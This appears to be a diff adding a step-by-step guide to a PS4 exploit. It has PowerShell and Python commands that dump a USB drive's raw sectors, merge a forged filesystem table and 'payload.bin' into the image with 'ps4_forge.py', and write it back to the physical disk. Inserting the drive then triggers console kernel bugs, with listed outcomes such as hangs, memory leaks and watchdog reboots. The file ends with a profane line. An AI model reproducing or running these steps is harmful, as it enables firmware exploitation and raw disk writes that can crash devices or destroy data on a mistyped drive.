@@ -1,3 +1,153 @@
+The writeup is below, in this section i have put basic instructions.
+
+
+# Commands
+
+## Prerequisites
+- USB 3.0 drive, ≥ 250 GB real capacity
+- Formatted on PS4 as extended storage at least once
+- Elevated PowerShell (Run powershell as admin)
+- `ps4_forge.py` and `payload.bin` in repo folder
+- A folder in `C:\ufs` with a file `C:\ufs\my_drive_X.bin`, change X to the drive number you use when running the dump command.
+
+## Step 1 — find the disk number
+
+```powershell
+python ps4_forge.py --list
+```
+
+**Desired:** the ≥ 250 GB drive appears with its index. Call it `$D`.
+
+## Step 2 — confirm the record
+
+```powershell
+python ps4_forge.py --diagnose --disk $D
+```
+
+**Desired:**
+```
+label: PRESENT at 0x6000
+version at 0x6024: 03000000  (3)
+len_a  at 0x6030: <your value>
+len_b  at 0x6038: <your value>
+```
+
+If `label: NOT FOUND` → format the drive on the PS4 first.
+
+## Step 3 — dump your own drive
+
+```powershell
+$D = x # REPLACE X WITH YOUR EXTERNAL DRIVE NUMBER. DO NOT FORGET TO MAKE THE FILE SO IT CAN WRITE THERE.
+$out = "C:\ufs\my_drive_$D.bin"
+
+$h = [IO.File]::OpenRead("\\.\PhysicalDrive$D")
+$b = New-Object byte[] (16MB)
+$read = 0
+while ($read -lt 16MB) {
+    $n = $h.Read($b, $read, 16MB - $read)
+    if ($n -le 0) { break }
+    $read += $n
+}
+$h.Close()
+[IO.File]::WriteAllBytes($out, $b)
+"captured $read bytes to $out"
+```
+
+**Desired:** `captured 16777216 bytes to C:\ufs\my_drive_X.bin`
+
+## Step 4 — disable the length-field patch
+
+Open `ps4_forge.py`. Find `forge_pfs`. Comment these two lines:
+
+```python
+# struct.pack_into("<Q", img, LEN_A_OFF, LEN_A_GOOD)
+# struct.pack_into("<Q", img, LEN_B_OFF, LEN_B_GOOD)
+```
+
+Save.
+
+**Desired:** `len_a` / `len_b` no longer patched on merge.
+
+## Step 5 — merge (no write)
+
+```powershell
+python ps4_forge.py --mode all --payload payload.bin `
+    --base "C:\ufs\my_drive_$D.bin" `
+    --table-off 0x100000 `
+    --disk $D `
+    --no-write
+```
+
+**Desired:**
+```
+merged  : merged_all.bin (16,777,216 bytes)
+table at 0x100000  mode=all  entry_size=0x38
+  00100000  02 00 00 00 00 00 00 00 0b 00 00 00 00 00 00 00
+  00100010  62 6c 6b 5f 62 69 74 6d 61 70 00 00 00 00 00 00
+```
+
+if you want to manually verify this, open `merged_all.bin` in HxD against `my_drive_$D.bin`. Only `0x6040`+, `0x100000`, `0x100038` differ. Header `0x6000`–`0x603F` unchanged.
+
+## Step 6 — write
+
+```powershell
+python ps4_forge.py --mode all --payload payload.bin `
+    --base "C:\ufs\my_drive_$D.bin" `
+    --table-off 0x100000 `
+    --disk $D `
+    --force
+```
+
+**Desired:**
+```
+saved MBR sig 55 aa
+  100%  16,777,216/16,777,216
+MBR restored
+verifying...
+  label  OK
+  table  id=2 stride=0x0
+  len_a  OK
+  len_b  OK
+```
+
+If error 21 → `python ps4_forge.py --reset --disk $D`, retry.
+
+## Step 7 — verify
+
+```powershell
+$h = [IO.File]::OpenRead("\\.\PhysicalDrive$D")
+$h.Seek(0x100000, 'Begin') | Out-Null
+$tbl = New-Object byte[] 0x70
+$h.Read($tbl, 0, 0x70) | Out-Null
+$h.Close()
+
+for ($i = 0; $i -lt 0x70; $i += 16) {
+    $row = $tbl[$i..($i+15)]
+    $hex = ($row | ForEach-Object { '{0:X2}' -f $_ }) -join ' '
+    "0x{0:X6}  {1}" -f (0x100000 + $i), $hex
+}
+```
+
+**Desired:**
+```
+0x100000  02 00 00 00 00 00 00 00 0B 00 00 00 00 00 00 00
+0x100010  62 6C 6B 5F 62 69 74 6D 61 70 00 00 00 00 00 00
+0x100020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+0x100030  00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00
+```
+
+## Step 8 — eject and insert
+
+Eject from the Windows tray icon. Insert into PS4. Settings → Storage → Extended Storage.
+
+**Desired:**
+- Console hangs, LED solid → **bug A fired** — power-cycle to recover
+- LED flashes 30–90s, reboot with error code → bug A + watchdog
+- Console runs out of RAM 1–2 min, reboots → leak entry fired
+- `CE-41901-5` on mount attempt → capacity gate, drive under 250 GB at SCSI
+- "Unrecognized filesystem" → superblock rejected
+- Same behavior as baseline → walker not reached; try `--table-off 0x0`, then `--table-off 0x100000 --entry-size 0x10`
+
 
 
 # fuck you.
